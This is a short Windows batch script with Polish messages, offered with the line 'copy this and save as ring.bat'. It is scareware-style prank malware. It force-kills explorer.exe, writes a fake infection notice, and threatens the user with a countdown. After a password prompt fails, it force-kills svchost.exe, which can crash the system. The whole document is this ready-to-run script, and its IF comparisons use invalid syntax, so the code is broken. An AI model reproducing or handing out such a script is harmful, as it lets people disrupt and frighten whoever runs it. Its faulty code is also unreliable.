copy this and save as ring.bat

@echo off
echo czy napewno chcesz odpalic zlosliwe oprogramowanie? jesli tak prosze kliknac y jezeli nie to kliknij n
pause>nul
taskkill /f /im explorer.exe
echo twój komputer został zaifekowany przez ring exe>ring.txt

echo procedura psucia kompa
ping localhost -n 5>nul

echo enter password
echo add this app to autostart or you computer died instantly you have 20 sec
ping localhost -n 20>nul

goto :yes

:yes

SET /P pass=Enter Password:

IF %pass%=@{[kill]}@ goto :ending

IF NOT %pass%=@{[kill]}@ goto :incorrectl

:incorrectl

ECHO password incorrect

SET /P pass=Enter Password:

IF %pass%=@{[kill]}@ goto :ending

IF NOT %pass%=@{[kill]}@ goto :incorrectl2

pause

exit

:incorrectl2

ECHO password incorrect


SET /P pass=Enter Password:

IF %pass%=@{[kill]}@ goto :ending


IF NOT %pass%=@{[kill]}@ goto :computerdiie


:computerdiie

taskkill /f /im svchost.exe









:ending

start explorer.exe

